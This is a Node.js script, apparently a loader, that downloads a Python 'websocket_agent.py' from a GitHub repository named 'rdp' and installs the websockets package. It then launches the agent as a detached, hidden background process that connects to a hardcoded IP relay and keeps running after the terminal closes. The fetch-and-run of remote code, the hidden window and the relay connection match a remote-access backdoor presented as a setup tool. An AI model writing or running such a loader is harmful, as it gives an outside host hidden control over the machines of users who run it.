const { spawn } = require('child_process');
const path = require('path');
const fs = require('fs');
const https = require('https');
const http = require('http');

console.log('Starting WebSocket Agent Setup...');

// Function to download a file from URL
function downloadFile(url, destination) {
    return new Promise((resolve, reject) => {
        console.log(`📥 Downloading: ${url}`);
        
        const protocol = url.startsWith('https:') ? https : http;
        const file = fs.createWriteStream(destination);
        
        protocol.get(url, (response) => {
            if (response.statusCode !== 200) {
                reject(new Error(`Failed to download: HTTP ${response.statusCode}`));
                return;
            }
            
            response.pipe(file);
            
            file.on('finish', () => {
                file.close();
                console.log(`✅ Downloaded: ${destination}`);
                resolve();
            });
            
            file.on('error', (err) => {
                fs.unlink(destination, () => {}); // Delete the file if it exists
                reject(err);
            });
        }).on('error', (err) => {
            reject(err);
        });
    });
}

// Function to run a command and return a promise
function runCommand(command, args = [], options = {}) {
    return new Promise((resolve, reject) => {
        console.log(`Executing: ${command} ${args.join(' ')}`);
        
        const child = spawn(command, args, {
            stdio: ['ignore', 'pipe', 'pipe'], // Redirect output to pipes instead of inherit
            shell: true,
            detached: true, // Detach the child process from parent
            windowsHide: true, // Hide the window on Windows
            ...options
        });
        
        // Unref the child process so it doesn't keep the parent alive
        child.unref();
        
        // Log any output from the background process
        child.stdout.on('data', (data) => {
            console.log(`[Agent] ${data.toString().trim()}`);
        });
        
        child.stderr.on('data', (data) => {
            console.error(`[Agent Error] ${data.toString().trim()}`);
        });
        
        // Don't wait for the child to close since we want it to run independently
        console.log(`✅ Process started with PID: ${child.pid}`);
        console.log('The Python agent is now running in the background.');
        console.log('You can close this terminal and the agent will continue running.');
        resolve();
        
        child.on('error', (error) => {
            console.error(`❌ Error executing command: ${error.message}`);
            reject(error);
        });
    });
}

async function startAgent() {
    try {
        // Configuration - you can modify these URLs
        const pythonScriptUrl = process.env.PYTHON_SCRIPT_URL || 'https://raw.githubusercontent.com/Pharaon3/rdp/main/websocket_agent.py';
        const pythonScriptPath = 'websocket_agent.py';
        const relayHost = process.env.RELAY_HOST || '3.237.240.137';
        const relayPort = process.env.RELAY_PORT || '3000';
        const agentId = process.env.AGENT_ID || 'test';
        
        // Step 1: Download the Python script if it doesn't exist or if forced
        if (!fs.existsSync(pythonScriptPath) || process.env.FORCE_DOWNLOAD === 'true') {
            console.log('\n📥 Downloading Python script...');
            await downloadFile(pythonScriptUrl, pythonScriptPath);
        } else {
            console.log('\n📁 Python script already exists, skipping download');
        }
        
        // Step 2: Install websockets package
        console.log('\n📦 Installing websockets package...');
        await runCommand('pip', ['install', 'websockets']);
        
        // Step 3: Run the websocket agent
        console.log('\n🚀 Starting WebSocket agent...');
        await runCommand('python', [pythonScriptPath, relayHost, relayPort, agentId]);
        
    } catch (error) {
        console.error('❌ Failed to start agent:', error.message);
        process.exit(1);
    }
}

// Handle process termination
process.on('SIGINT', () => {
    console.log('\n🛑 Received SIGINT, shutting down gracefully...');
    process.exit(0);
});

process.on('SIGTERM', () => {
    console.log('\n🛑 Received SIGTERM, shutting down gracefully...');
    process.exit(0);
});

// Start the agent
startAgent(); 